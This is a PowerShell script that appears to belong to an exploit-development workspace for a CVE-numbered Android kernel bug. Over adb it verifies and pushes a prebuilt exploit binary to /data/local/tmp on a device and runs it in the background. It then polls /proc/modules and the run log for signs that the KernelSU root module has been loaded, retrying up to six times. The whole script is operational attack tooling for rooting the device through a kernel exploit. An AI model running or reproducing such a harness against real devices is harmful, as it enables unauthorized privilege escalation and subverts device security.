# Retry loop: verify payload integrity, run the exploit, check for a live kernelsu.
$ErrorActionPreference = "Continue"
$dev   = "0484885189A00540"
$local = "E:\code\CVE\cve-2026-98260-xring\o3root-port\build\o3p_ksu_cfi.bin"
$hash  = (Get-FileHash $local -Algorithm SHA256).Hash.ToLower()
$out   = "E:\code\CVE\cve-2026-98260-xring\ab-logs\ksu-loop.txt"

function Log($m) { $m | Tee-Object -FilePath $out -Append }

Remove-Item $out -ErrorAction SilentlyContinue
Log "=== ksu loop start $(Get-Date -Format HH:mm:ss) hash=$hash"

for ($round = 1; $round -le 6; $round++) {
    $devhash = (adb -s $dev shell "sha256sum /data/local/tmp/o3pK.bin 2>/dev/null") -join " "
    if ($devhash -notmatch $hash) {
        Log "[$round] payload missing/damaged -> re-push"
        adb -s $dev push $local /data/local/tmp/o3pK.bin 2>&1 | Out-Null
        $devhash = (adb -s $dev shell "sha256sum /data/local/tmp/o3pK.bin 2>/dev/null") -join " "
        if ($devhash -notmatch $hash) { Log "[$round] PUSH FAILED: $devhash"; continue }
    } else {
        Log "[$round] payload ok"
    }
    adb -s $dev shell "chmod 755 /data/local/tmp/o3pK.bin" | Out-Null

    $up0 = (adb -s $dev shell "cut -d' ' -f1 /proc/uptime") -join ""
    adb -s $dev shell "cd /data/local/tmp; rm -f run_$round.log o3p_insmod.out; nohup ./o3pK.bin 10000 8192 0 0 6 1 8000 200 > run_$round.log 2>&1 & echo bg" | Out-Null

    Start-Sleep -Seconds 155

    $up1  = (adb -s $dev shell "cut -d' ' -f1 /proc/uptime") -join ""
    $mods = (adb -s $dev shell "grep -c kernelsu /proc/modules 2>/dev/null") -join ""
    $ins  = (adb -s $dev shell "cat /data/local/tmp/o3p_insmod.out 2>/dev/null") -join " | "
    $keys = (adb -s $dev shell "grep -a -E 'UIDNOW|KSU_MODULE|KSU_INSMOD|KSU_WROTE|KSU_EXEC|FULLROOT' /data/local/tmp/run_$round.log 2>/dev/null | tail -8") -join " | "

    Log "[$round] uptime $up0 -> $up1  kernelsu=$mods"
    Log "     $keys"
    if ($ins.Trim().Length -gt 0) { Log "     insmod: $ins" }

    if ($mods -eq "1") { Log "[$round] *** KERNELSU LIVE ***"; break }
}
Log "=== loop end $(Get-Date -Format HH:mm:ss)"
